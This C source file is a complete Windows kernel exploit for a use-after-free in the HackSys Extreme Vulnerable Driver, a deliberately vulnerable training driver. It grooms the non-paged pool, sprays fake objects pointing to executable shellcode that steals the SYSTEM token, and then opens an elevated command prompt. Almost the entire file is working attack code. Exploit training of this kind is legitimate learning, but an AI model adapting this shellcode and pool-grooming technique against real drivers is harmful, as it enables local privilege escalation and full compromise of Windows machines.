#pragma warning (disable : 6001)

#include "exploit.h"

// This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
// https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

char shellcode[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0), pool_allocations[16384], pool_allocations_2[16384];
	long long* shellcode_address = 0;
	unsigned long bytes_returned = 0;
	char unused = 0, output[1024], input[0x70];

	RtlSecureZeroMemory(&pool_allocations, sizeof(pool_allocations));
	RtlSecureZeroMemory(&pool_allocations_2, sizeof(pool_allocations_2));
	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Use After Free Non-Paged Pool NX");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the HackSys Extreme Vulnerable Driver. Handle Value: 0x%p", h_driver);

	shellcode_address = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_address)
	{
		printf("\n[-] Failed to allocate %d bytes of stack memory. Error: %d (0x%x)", (int)sizeof(shellcode), GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated %d bytes of stack memory. Shellcode Allocation Address: 0x%p", (int)sizeof(shellcode), shellcode_address);

	memcpy(shellcode_address, &shellcode, sizeof(shellcode));
	printf("\n[+] Mapped shellcode onto the allocation.");

	for (int i = 0; i < sizeof(input); i += 8)
	{
		*(long long*)(input + i) = shellcode_address;
	}
	printf("\n[+] Prepared the input buffer.");

	for (int i = 0; i < sizeof(pool_allocations_2) / sizeof(HANDLE); i++)
	{
		pool_allocations[i] = CreateFileA(DEVICE, 0, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Derandomized non-paged pool.");

	for (int i = 0; i < sizeof(pool_allocations_2) / sizeof(HANDLE); i++)
	{
		pool_allocations_2[i] = CreateFileA(DEVICE, 0, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Allocated consecutive non-paged pool chunks.");

	for (int i = 0; i < sizeof(pool_allocations_2) / sizeof(HANDLE); i += 2)
	{
		CloseHandle(pool_allocations_2[i]);
	}
	printf("\n[+] Created holes in the non-paged pool.");

	DeviceIoControl(h_driver, ALLOCATE_UAF_OBJECT_NX_IOCTL, 0, 0, &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Allocated use-after-free object.");

	DeviceIoControl(h_driver, FREE_UAF_OBJECT_NX_IOCTL, 0, 0, &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Freed use-after-free object.");

	for (int i = 0; i < 4096; i++)
	{
		DeviceIoControl(h_driver, ALLOCATE_FAKE_OBJECT_NX_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	}
	printf("\n[+] Allocated 4096 fake use-after-free objects.");

	printf("\n[!] Forcing usage of a fake use-after-free object...");
	DeviceIoControl(h_driver, USE_UAF_OBJECT_NX_IOCTL, 0, 0, &output, sizeof(output), &bytes_returned, 0);
	Sleep(500);
	printf("\n[!] Holy shit, we successfully exploited the most unreliable exploit primitive!");

	for (int i = 0; i < sizeof(pool_allocations) / sizeof(HANDLE); i++)
	{
		if (pool_allocations[i])
		{
			CloseHandle(pool_allocations[i]);
		}
	}
	for (int i = 0; i < sizeof(pool_allocations_2) / sizeof(HANDLE); i++)
	{
		if (pool_allocations_2[i])
		{
			CloseHandle(pool_allocations_2[i]);
		}
	}
	printf("\n[+] Freed allocated non-paged pool objects.\n[+] Exploit completed.");
	system("start cmd.exe");
	unused = getchar();
	return 0;
}